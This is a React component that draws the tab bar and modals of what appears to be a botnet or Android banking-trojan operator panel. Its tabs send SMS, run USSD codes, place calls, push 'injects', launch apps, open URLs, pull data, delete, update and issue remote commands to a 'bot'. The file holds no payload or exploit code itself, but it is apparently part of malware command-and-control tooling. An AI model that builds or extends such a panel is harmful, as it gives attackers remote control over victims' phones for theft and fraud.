import { FC, useContext } from "react"
import {
  MailOutlined,
  PhoneOutlined,
  PlayCircleOutlined,
  RedoOutlined,
  IeOutlined,
  WechatOutlined,
  GoogleOutlined,
  DeleteOutlined,
  CodeOutlined,
  DownloadOutlined,
  GlobalOutlined,
  NumberOutlined
} from '@ant-design/icons';
import { BotContext } from './providers';
import { BotStateType } from "../../common/DataType";
import { Modal } from "antd";
import SMS from "./Tabs/SMS";
import Call from "./Tabs/Call";
import USSD from "./Tabs/USSD";
import Inject from "./Tabs/Inject";
import Run from "./Tabs/Run";
import Push from "./Tabs/Push";
import URL from "./Tabs/URL";
import Delete from "./Tabs/Delete";
import Update from "./Tabs/Update";
import Google from "./Tabs/Google";
import Command from "./Tabs/Command";
import Data from "./Tabs/Data";

const TabButton = ({title, ICON, value}: {title: string, ICON: FC, value: string}) => {

  const { state, setState } = useContext(BotContext)

  const onHandleClick = () => {
    setState((state: BotStateType) => {
      return {
        ...state,
        botTab: {
          ...state.botTab,
          [value]: true
        }
      }
    })
  }

  return (
    <div className="text-stone-500 pt-2 pr-4 pl-4 ml-2 mr-2 cursor-pointer hover:text-stone-200 duration-300" onClick={onHandleClick}>
      <div className="text-base text-center"><ICON/></div>
      <span className="text-center text-base">{title}</span>
    </div>
  )
}

export default () => {
  const { state, setState } = useContext(BotContext)

  const onClose = (type: string) => {
    setState((state: BotStateType) => {
      return {
        ...state,
        botTab: {
          [type]: false
        }
      }
    })
  }

  return (
      <div className="h-16 w-full fixed bottom-0">
        <div className="h-16 flex rounded-xl bg-zinc-800 m-auto w-fit">
          <TabButton title="SMS" ICON={MailOutlined} value='sms'/>
          <TabButton title="USSD" ICON={NumberOutlined} value='ussd'/>
          <TabButton title="Call" ICON={PhoneOutlined} value='call'/>
          <TabButton title="Inject" ICON={GlobalOutlined} value='inject'/>
          <TabButton title="Run App" ICON={PlayCircleOutlined} value='run'/>
          <TabButton title="PUSH" ICON={WechatOutlined} value='push'/>
          <TabButton title="Open URL" ICON={IeOutlined} value='url'/>
          <TabButton title="Get Data" ICON={DownloadOutlined} value='data'/>
          <TabButton title="Delete" ICON={DeleteOutlined} value='delete'/>
          <TabButton title="Update" ICON={RedoOutlined} value='update'/>
          <TabButton title="Goolge" ICON={GoogleOutlined} value='google'/>
          <TabButton title="Commands" ICON={CodeOutlined} value='command'/>
        </div>

        <Modal centered visible={state.botTab.sms} footer={false} onCancel={() => {onClose('sms')}}><SMS/></Modal>
        <Modal centered visible={state.botTab.ussd} footer={false} onCancel={() => {onClose('ussd')}}><USSD/></Modal>
        <Modal centered visible={state.botTab.call} footer={false} onCancel={() => {onClose('call')}}><Call/></Modal>
        <Modal centered visible={state.botTab.inject} footer={false} onCancel={() => {onClose('inject')}}><Inject/></Modal>
        <Modal centered visible={state.botTab.run} footer={false} onCancel={() => {onClose('run')}}><Run/></Modal>
        <Modal centered visible={state.botTab.push} footer={false} onCancel={() => {onClose('push')}}><Push/></Modal>
        <Modal centered visible={state.botTab.url} footer={false} onCancel={() => {onClose('url')}}><URL/></Modal>
        <Modal centered visible={state.botTab.data} footer={false} onCancel={() => {onClose('data')}}><Data/></Modal>
        <Modal centered visible={state.botTab.delete} footer={false} onCancel={() => {onClose('delete')}}><Delete/></Modal>
        <Modal centered visible={state.botTab.update} footer={false} onCancel={() => {onClose('update')}}><Update/></Modal>
        <Modal centered visible={state.botTab.google} footer={false} onCancel={() => {onClose('google')}}><Google/></Modal>
        <Modal centered visible={state.botTab.command} footer={false} onCancel={() => {onClose('command')}}><Command/></Modal>
      </div>
  )
}